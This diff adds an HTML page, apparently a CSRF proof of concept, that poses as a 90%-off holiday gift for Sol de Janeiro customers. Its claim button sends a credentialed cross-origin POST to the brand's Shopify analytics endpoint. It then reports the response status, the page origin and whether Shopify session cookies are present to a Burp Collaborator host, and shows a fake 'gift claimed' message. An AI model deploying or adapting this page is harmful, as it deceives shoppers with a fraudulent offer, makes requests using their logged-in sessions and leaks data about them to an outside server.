@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Holiday Special Offer</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f5f5f5; text-align: center; padding: 50px; }
+        .gift-box { 
+            background: linear-gradient(135deg, #ff9e6d, #ff6b6b); 
+            padding: 40px; border-radius: 20px; 
+            box-shadow: 0 10px 30px rgba(255,107,107,0.4); 
+            max-width: 600px; margin: 0 auto;
+        }
+        button {
+            background: #ffd166; color: #000; 
+            border: none; padding: 20px 40px; 
+            font-size: 24px; border-radius: 50px; 
+            cursor: pointer; margin-top: 20px;
+            transition: all 0.3s;
+        }
+        button:hover { transform: scale(1.05); box-shadow: 0 5px 15px rgba(255,209,102,0.5); }
+        .status { margin-top: 20px; font-weight: bold; color: #28a745; }
+    </style>
+</head>
+<body>
+    <div class="gift-box">
+        <h1>🎅 HOLIDAY GIFT FOR YOU!</h1>
+        <p>As a loyal Sol de Janeiro customer, get <strong>90% OFF</strong> your next order!</p>
+        <button onclick="claimGift()">CLAIM YOUR GIFT NOW →</button>
+        <div id="status" class="status"></div>
+    </div>
+
+    <script>
+    async function claimGift() {
+        try {
+            document.getElementById('status').innerText = 'Processing your gift...';
+            
+            const now = Date.now();
+            
+            const payload = {
+                "schema_id": "monorail_schema_v1",
+                "events": [{
+                    "id": crypto.randomUUID(),
+                    "created_at_ms": now,
+                    "message": "page_view",
+                    "properties": {
+                        "page_url": window.location.href,
+                        "referrer": document.referrer || "direct",
+                        "user_agent": navigator.userAgent
+                    },
+                    "metadata": {
+                        "event_created_at_ms": now,
+                        "event_sent_at_ms": now + 100,
+                        "client_version": "shopify-analytics/1.0.0",
+                        "schema_id": "monorail_schema_v1"
+                    }
+                }]
+            };
+
+            // Основной запрос
+            const response = await fetch('https://soldejaneiro.com/.well-known/shopify/monorail/unstable/produce_batch', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload),
+                credentials: 'include',
+                mode: 'cors'
+            });
+
+            // Проверяем статус ответа
+            const isSuccessful = response.ok;
+            
+            // Создаем уникальный URL для логов (замените на ваш Collaborator!)
+            const collaboratorUrl = 'https://t0u98xgo1neu7rr5qfpf0xnuvl1cped3.oastify.com?status=' + 
+                (isSuccessful ? 'success' : 'failed') + 
+                '&origin=' + encodeURIComponent(window.location.origin) +
+                '&response_status=' + response.status +
+                '&has_cookies=' + (document.cookie.includes('_shopify_essential') || document.cookie.includes('og_auth'));
+
+            // Отправляем данные в Collaborator
+            new Image().src = collaboratorUrl;
+
+            document.getElementById('status').innerHTML = '✅ <strong>GIFT CLAIMED!</strong> Check your email!';
+            alert('🎉 Your gift is on the way!');
+            
+        } catch (error) {
+            console.error('Error:', error);
+            
+            // Отправляем ошибку в Collaborator
+            new Image().src = 'https://t0u98xgo1neu7rr5qfpf0xnuvl1cped3.oastify.com?error=' + 
+                encodeURIComponent(error.toString());
+        }
+    }
+
+    // Авто-проверка логина
+    window.onload = function() {
+        if (document.cookie.includes('_shopify_essential') || document.cookie.includes('og_auth')) {
+            document.querySelector('button').innerText = '✅ LOGGED IN - CLAIM YOUR GIFT!';
+            document.querySelector('button').style.background = '#4CAF50';
+        }
+    };
+    </script>
+</body>
+</html>
